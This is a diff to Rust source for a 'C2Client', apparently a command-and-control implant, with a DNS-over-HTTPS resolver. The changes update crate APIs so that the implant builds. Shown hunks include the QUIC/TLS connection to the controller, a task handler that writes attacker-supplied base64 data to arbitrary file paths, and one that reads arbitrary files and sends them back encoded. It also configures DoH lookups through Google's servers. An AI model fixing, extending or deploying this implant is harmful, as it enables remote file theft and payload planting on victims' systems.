@@ -1,19 +1,21 @@
 use anyhow::{anyhow, Result};
+use base64::{Engine as _, engine::general_purpose};
 use chacha20poly1305::{
-    aead::{Aead, KeyInit, OsRng, AeadCore}, // Added AeadCore
-    XChaCha20Poly1305, XNonce,
+    aead::{Aead, KeyInit},
+    XChaCha20Poly1305, XNonce, AeadCore,
 };
 use quinn::{ClientConfig, Endpoint};
 use rustls::{ClientConfig as RustlsClientConfig, RootCertStore};
 use serde::{Deserialize, Serialize};
-use std::net::{SocketAddr, IpAddr};
+use std::net::{SocketAddr, IpAddr, Ipv4Addr};
 use std::sync::Arc;
 use std::time::Duration;
 use tokio::time::sleep;
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
+// Removed AsyncWriteExt
 use tokio::process::Command;
 use rand::Rng;
-use trust_dns_resolver::config::{ResolverConfig, ResolverOpts};
+use rand::rngs::OsRng;
+use trust_dns_resolver::config::{ResolverConfig, ResolverOpts, NameServerConfig, Protocol};
 use trust_dns_resolver::TokioAsyncResolver;
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -87,8 +89,8 @@ impl C2Client {
     pub async fn connect(&mut self) -> Result<()> {
         let mut endpoint = Endpoint::client("0.0.0.0:0".parse().unwrap())?;
         let mut root_store = RootCertStore::empty();
-        root_store.add_server_trust_anchors(
-            webpki_roots::TLS_SERVER_ROOTS.0.iter().map(|ta| {
+        root_store.add_trust_anchors(
+            webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
                 rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                     ta.subject,
                     ta.spki,
@@ -132,8 +134,7 @@ impl C2Client {
             send_stream.finish().await?;
 
             // Receive
-            let mut buf = Vec::new();
-            recv_stream.read_to_end(&mut buf).await?;
+            let buf = recv_stream.read_to_end(10 * 1024 * 1024).await?; // 10MB limit
             if buf.is_empty() {
                 return Ok(None);
             }
@@ -182,7 +183,7 @@ impl C2Client {
                  }
                  let path = &args[0];
                  let content = &args[1];
-                 match base64::decode(content) {
+                 match general_purpose::STANDARD.decode(content) {
                      Ok(data) => {
                          match tokio::fs::write(path, data).await {
                              Ok(_) => C2Message::Result { task_id: task_id.to_string(), output: "Upload success".into(), exit_code: 0 },
@@ -199,7 +200,7 @@ impl C2Client {
                 let path = &args[0];
                 match tokio::fs::read(path).await {
                     Ok(data) => {
-                        let content = base64::encode(data);
+                        let content = general_purpose::STANDARD.encode(data);
                         C2Message::Result { task_id: task_id.to_string(), output: content, exit_code: 0 }
                     }
                     Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Read failed: {}", e), exit_code: 1 },
@@ -263,12 +264,31 @@ impl DoHResolver {
         } else if server_url.contains("quad9") {
             ResolverConfig::quad9_https()
         } else {
-            ResolverConfig::google_https()
+            // Manual construction for Google DoH to ensure HTTPS
+            // Using struct literal based on trust-dns-resolver 0.21 public fields.
+            let mut config = ResolverConfig::new();
+            config.add_name_server(NameServerConfig {
+                socket_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::new(8, 8, 8, 8)), 443),
+                protocol: Protocol::Https,
+                tls_dns_name: Some("dns.google".to_string()),
+                trust_nx_responses: false,
+                bind_addr: None,
+                tls_config: None,
+            });
+            config.add_name_server(NameServerConfig {
+                socket_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::new(8, 8, 4, 4)), 443),
+                protocol: Protocol::Https,
+                tls_dns_name: Some("dns.google".to_string()),
+                trust_nx_responses: false,
+                bind_addr: None,
+                tls_config: None,
+            });
+            config
         };
 
         let opts = ResolverOpts::default();
         let resolver = TokioAsyncResolver::tokio(config, opts);
-        Ok(DoHResolver { resolver })
+        Ok(DoHResolver { resolver: resolver? })
     }
 
     pub async fn resolve(&self, domain: &str) -> Result<Vec<IpAddr>> {
